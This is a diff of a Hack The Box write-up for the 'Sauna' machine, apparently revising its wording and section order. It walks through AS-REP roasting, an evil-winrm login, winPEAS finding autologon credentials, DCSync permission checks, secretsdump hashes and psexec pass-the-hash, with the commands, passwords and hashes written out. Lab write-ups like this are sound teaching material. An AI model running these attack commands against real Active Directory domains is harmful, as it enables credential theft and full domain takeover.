@@ -109,11 +109,11 @@ Let's store them into `targetusers.txt`.
 
 ## AS-REP Roasting
 
-AS-REP roasting is the process of getting the Authentication Server to reply with information that we can crack for credentials.
+AS-REP roasting is the process of getting the **Authentication Server to reply** with information that we can crack for credentials.
 
 How it works:
 
-1. User sends a request to the Kerberos Authentication Server (AS).
+1. User sends a request to the Kerberos Authentication Server (AS) within the Key Distribution Center.
 2. As pre-authentication is disabled, the AS will reply with a logon session key and a Ticket-Granting Ticket (TGT) **without checking any credentials**. (Hence, AS-REP.)
 3. Both the **logon session key** and the **TGT** are encrypted.
 3. In particular, the logon session key is encrypted with a key derived from the **user's password**.
@@ -126,7 +126,7 @@ Conditions:
 
 ### Requesting For Encrypted Ticket From AS
 
-For Linux, [Impacket](https://github.com/SecureAuthCorp/impacket) is the go-to tool for pentesting Kerberos.
+For Linux, [Impacket](https://github.com/SecureAuthCorp/impacket) is one of the go-to tools for pentesting Windows services including Kerberos.
 
 `./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile targetusers.txt -format john -outputfile hashes.asreproast`
 
@@ -138,7 +138,7 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 User hsmith requires Pre-Authentication so we cannot get the TGT and the encrypted logon session key.
 
-But we are able to obtain the information for fsmith.
+There's no error for user fsmith, which means that we have successfully obtained the required information for this user.
 
 (The nmap script above and GetNPUsers use the same mechanism, so technically we could have skipped the separate user enumeration.)
 
@@ -183,7 +183,7 @@ We get **user**.
 
 ## Finding The Autologon Password
 
-winPEAS stands for [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS).
+winPEAS stands for [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). It is a fantastic script for finding privilege escalation vectors.
 
 Let's run it to automate initial privilege escalation enumeration.
 
@@ -194,7 +194,7 @@ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 -e /folder/withbinary/
 *Evil-WinRM* PS C:\Users\FSmith\Documents> Invoke-Binary /folder/withbinary/winPEAS.exe
 ```
 
-It returns a long output, but the default highlighting makes it easy to spot the following.
+It returns a long output, but the default color highlighting makes it easy to spot the following.
 
 ```
 [+] Looking for AutoLogon credentials(T1012)
@@ -221,6 +221,28 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     DefaultPassword    REG_SZ    Moneymakestheworldgoround!
 ```
 
+## Comparing Active Directory Permissions
+
+Since we've gained access to a new account (svc_loanmgr), it makes sense to find out if it comes with new permissions that we can exploit. 
+
+We need the ActiveDirectory module for the [following commands](https://devblogs.microsoft.com/scripting/use-powershell-to-explore-active-directory-security/), so let's import it.
+
+`Import-Module ActiveDirectory`
+
+* In the command below, the part before `|` gets specific access permissions of objects in the stated domain. 
+
+* It returns many results, so the part after `|` filters the output to show only the permissions of the user we are interested in.
+
+`(Get-Acl "AD:dc=EGOTISTICAL-BANK,dc=LOCAL").access | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}`
+
+![fsmith permissions](images/sauna/fsmithperm.jpg)
+
+`(Get-Acl "AD:dc=EGOTISTICAL-BANK,dc=LOCAL").access | Where-Object {$_.IdentityReference –eq "EGOTISTICALBANK\svc_loanmgr"}`
+
+![svc_loanmgr permissions](images/sauna/svc_loanmgrperm.jpg)
+
+Svc_loanmgr appears to have a few interesting permissions. Researching these permissions reveals that they are associated with a DCSync exploit.
+
 ## DCSync Attack
 
 Many Active Directory (AD) infrastructure has multiple Domain Controllers. To maintain a consistent environment, you need a way to replicate AD objects for each DC. The replication is done through the DRSUAPI API.
@@ -243,51 +265,7 @@ The “Replicating Directory Changes In Filtered Set” extended right (not alwa
 * CN: DS-Replication-Get-Changes-In-Filtered-Set
 * GUID: 89e95b76-444d-4c62-991a-0facbeda640c
 
-### Checking Active Directory Permissions
-
-We have compromised two accounts:
-
-* fsmith
-* svc_loanmgr.
-
-Let's check if any of them has the required permissions for a DCSync attack.
-
-We need the ActiveDirectory module for the following command, so let's import it.
-
-`Import-Module ActiveDirectory`
-
-* In the command below, the part before `|` gets specific access permissions of objects in the stated domain. 
-
-* It returns many results, so the part after `|` filters the output to show only the permissions that we are interested in. (i.e. the permissions that enable a DCsync attack.)
-
-`(Get-ACL "AD:dc=EGOTISTICAL-BANK,dc=LOCAL").access | Where-Object {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" )}`
-
-The results show that svc_loanmgr has the required permissions, so we can try a DCSync attack.
-
-```
-<SNIP>
-ActiveDirectoryRights : ExtendedRight
-InheritanceType       : None
-ObjectType            : 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-InheritedObjectType   : 00000000-0000-0000-0000-000000000000
-ObjectFlags           : ObjectAceTypePresent
-AccessControlType     : Allow
-IdentityReference     : EGOTISTICALBANK\svc_loanmgr
-IsInherited           : False
-InheritanceFlags      : None
-PropagationFlags      : None
-
-ActiveDirectoryRights : ExtendedRight
-InheritanceType       : None
-ObjectType            : 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-InheritedObjectType   : 00000000-0000-0000-0000-000000000000
-ObjectFlags           : ObjectAceTypePresent
-AccessControlType     : Allow
-IdentityReference     : EGOTISTICALBANK\svc_loanmgr
-IsInherited           : False
-InheritanceFlags      : None
-PropagationFlags      : None
-```
+These are the precise permissions that the svc_loanmgr has. Hence, we can conduct a DCsync attack.
 
 ### Dumping Secrets
 
@@ -312,11 +290,11 @@ Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af6
 [*] Cleaning up...
 ```
 
-Now that we have the hashes, we can use them to get admin access.
+Now that we have the hashes, we can use them to get SYSTEM access.
 
-### Passing The Hash
+## Passing The Hash
 
-The SMB port is open, so psexec is an option.
+From our port scan, we know that we have access to the SMB port, so psexec is an option.
 
 `./psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`
 
@@ -336,9 +314,11 @@ We are passing the NTLM hashes here.
 
 You can also use the Kerberos key. But there more details to pay attention to when you authenticate with Kerberos including time sync and using a FQDN.
 
-# Ending Thoughts
+# Thoughts
 
-This was my first Active Directory box. It spurred me to learn a lot more about Active Directory and Kerberos. It is a very educational box for me.
+This was my first Active Directory box. It spurred me to learn a lot more about Active Directory and Kerberos. 
+
+It is a very educational box for me.
 
 **References**
 
